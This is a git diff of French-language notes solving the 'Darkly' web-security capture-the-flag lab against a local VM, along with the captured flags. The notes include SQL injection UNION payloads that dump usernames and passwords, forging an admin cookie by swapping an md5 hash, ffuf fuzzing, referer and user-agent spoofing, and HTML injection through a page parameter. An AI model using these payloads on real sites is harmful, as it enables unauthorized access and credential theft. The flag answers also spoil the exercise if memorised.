@@ -4,17 +4,15 @@
 Recover password - webmaster@borntosec.com
 ~flag - 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0~
 
-La balise est cachee, si on supprime le contenu du form et qu'on submit, le flag nous est donne
+La balise est cachee, si on supprime le contenu du form et qu'on submit
 
 * Cookies :
 Cookies - I_am_admin 68934a3e9455fa72420237eb05902327
 hashid 68934a3e9455fa72420237eb05902327
-Le hash est en md5 est veut dire false
-
-echo true | md5
-74d9a83219cabaab06a69fd318873f335
-
-Remplacons le cookie
+Le hash est en md5 et veut dire false
+Remplacons le cookie par true
+echo -n true | md5
+~flag - df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3~
 
 * Search image :
 
@@ -37,9 +35,6 @@ ffuf -w payload.txt:FUZZ -u "http://192.168.56.103/?page=member&id=FUZZ&Submit=S
 5 UNION SELECT user_id,commentaire FROM users
 echo 'fortytwo' | sha2
 ~flag - 3b4e8a30ecbfde518f50f2bda1912b40338ecd71821faeb1e9cdf44cefff95f5~
-
-* Source page :
-?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c
 
 * Login :
 5 UNION SELECT username,password FROM Member_Brute_Force.db_default
@@ -66,6 +61,7 @@ modifier les parametres post dans le browser en mettant 42
 
 * Hidden directory :
 crawl le directory avec crawl.sh
+grep -v "gauche\|droite\|dessus\|dessous\|aussi\|bon\|non" result.txt
 ~flag - 99dde1d35d1fdd283924d84e6d9f1d820~
 
 * Upload image :
@@ -77,8 +73,11 @@ You must comming from : "https://www.nsa.gov/" to go to the next step
 Changer le referrer de la requete et le user agent
 ~flag - f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188~
 
-
-λ ~/gitlab/darkly/ main* ffuf -w ~/tmp/directory-list-2.3-medium.txt -u 'http://192.168.56.102/FUZZ'
+* Html-src :
+http://192.168.56.105/?page=media&src=nsa
+le src est remplacable par du code html
+~flag - 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d~
+ffuf -w ~/tmp/directory-list-2.3-medium.txt -u 'http://192.168.56.102/FUZZ'
 
  :: Method           : GET
  :: URL              : http://192.168.56.102/FUZZ
